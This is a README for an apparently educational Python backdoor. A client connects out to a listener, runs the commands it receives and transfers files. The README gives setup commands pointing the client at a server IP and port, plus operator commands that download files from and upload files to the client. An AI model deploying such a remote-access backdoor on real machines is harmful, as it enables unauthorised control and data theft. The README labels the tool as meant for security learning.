# Backdoor Project

This project is a client-server-based "Backdoor" application developed in Python. **network_socket.py** represents the client side, and **socket_listener.py** represents the server side. The main purpose of the project is to provide a platform for learning network programming and security testing. The project includes features such as command execution, file transfer, and directory management. **Misuse is strictly prohibited and it is intended for educational purposes only.**

---

## Features

### Client (network_socket.py):
1. **Command Execution**: Executes commands received from the server and sends the results back.
2. **File Transfer**: Enables uploading files to the server and downloading files from the client.
3. **Directory Management**: Allows changing the working directory.
4. **JSON Communication**: Transmits commands and file contents in JSON format.

### Server (socket_listener.py):
1. **Connection Management**: Listens for and accepts client connections.
2. **Command Dispatch**: Sends commands to the client and receives their output.
3. **File Transfer**: Manages downloading files from and uploading files to the client.
4. **User-Friendly Interface**: Provides a command-line interface.

---

## How It Works

This application is based on a basic client-server architecture:
1. The **server (socket_listener.py)** listens for incoming connections on a specified IP and port.
2. The **client (network_socket.py)** connects to the server and executes incoming commands.
3. Communication occurs using the JSON protocol, ensuring orderly processing of commands and files.

---

## Installation

### Requirements
- **Python 3.6 or higher**
- Required libraries: `simplejson`, `optparse` (These libraries come pre-installed with Python.)

### Steps
1. Clone the repository:
   ```bash
   git clone https://github.com/FurkanRecber/Backdoor.git
   cd Backdoor
   ```
2. Start the server:
   ```bash
   python socket_listener.py -i <server_ip> -p <port>
   ```
3. Start the client:
   ```bash
   python network_socket.py -i <server_ip> -p <port>
   ```

---

## Usage Details

### Server Side (socket_listener.py)
The server, after accepting a client connection, can send commands and retrieve their output.
- Available commands:
  - **`cd <directory>`**: Changes the working directory.
  - **`download <file_path>`**: Downloads the specified file from the client.
  - **`upload <file_path>`**: Uploads a file to the client.
  - **`exit`**: Terminates the connection.

#### Example Usage:
```bash
Enter command: cd /home/user
Enter command: download test.txt
Enter command: upload /path/to/local/file.txt
Enter command: exit
```

### Client Side (network_socket.py)
The client executes commands received from the server and sends the results back. It also handles file transfers and directory changes.

#### Example Scenarios:
- When the server sends the "download" command, the client sends the specified file to the server.
- When the server sends the "upload" command, the client receives the file and saves it locally.

---

## Project Structure
- **network_socket.py**: Python file managing the client-side operations. Connects to the server and processes incoming commands.
- **socket_listener.py**: Python file managing the server-side operations. Listens for and accepts client connections and sends commands.

---

## Warning
1. This software is intended strictly for **educational and testing purposes**.
2. **Unauthorized access** is unethical and illegal. Use the software only on systems you have permission to access.
3. Ensure compliance with network security protocols and set up a test environment before using the software.
4. The user is solely responsible for any outcomes resulting from its use. The developer cannot be held liable for any misuse.
